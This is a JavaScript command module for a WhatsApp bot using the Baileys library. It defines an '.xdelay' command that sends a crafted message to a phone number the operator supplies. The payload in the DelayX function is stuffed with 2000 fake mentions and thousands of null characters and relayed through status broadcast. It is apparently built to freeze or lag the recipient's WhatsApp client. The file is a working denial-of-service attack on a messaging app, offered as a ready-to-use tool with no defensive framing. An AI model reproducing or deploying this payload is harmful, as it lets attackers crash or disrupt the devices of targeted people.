const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');

// Command handler for xdelay
module.exports = {
  command: 'xdelay',
  description: 'Send a special delay message to a WhatsApp number',
  usage: '.xdelay [phoneNumber]',
  category: 'tools',
  async execute(sock, message, args) {
    try {
      // Extract the target number from command arguments
      if (!args[0]) {
        return await sock.sendMessage(message.key.remoteJid, {
          text: '❌ Please provide a target number. Usage: .xdelay [phoneNumber]'
        }, { quoted: message });
      }

      const target = args[0] + '@s.whatsapp.net';
      
      // Call the DelayX function with the target
      await DelayX(target, sock);
      
      // Send confirmation message
      await sock.sendMessage(message.key.remoteJid, {
        text: `✅ DelayX message successfully sent to ${args[0]}`
      }, { quoted: message });
      
    } catch (error) {
      console.error('Error executing xdelay command:', error);
      await sock.sendMessage(message.key.remoteJid, {
        text: '❌ Failed to send DelayX message. Please check the console for details.'
      }, { quoted: message });
    }
  }
};

// The DelayX function (modified to accept the socket instance)
async function DelayX(target, sock) {
  try {
    const msg = generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length: 2000 }, (_, y) => `1313555000${y + 1}@s.whatsapp.net`)
        },
        body: {
          text: "\u0000".repeat(450),
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: JSON.stringify({
            values: {
              in_pin_code: "999999",
              building_name: "ShaviDev",
              landmark_area: "X",
              address: "OneVDelay",
              tower_number: "OnevDelay",
              city: "Infinity",
              name: "ShaviDev",
              phone_number: "999999999999",
              house_number: "xxx",
              floor_number: "xxx",
              state: `+ | ${"\u0000".repeat(9000)}`
            }
          }),
          version: 3
        }
      }
    }, { userJid: target });

    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    });

    console.log(`DelayX successfully sent✅ to ${target}`);
  } catch (error) {
    console.error("DelayX error❌:", error);
  }
}
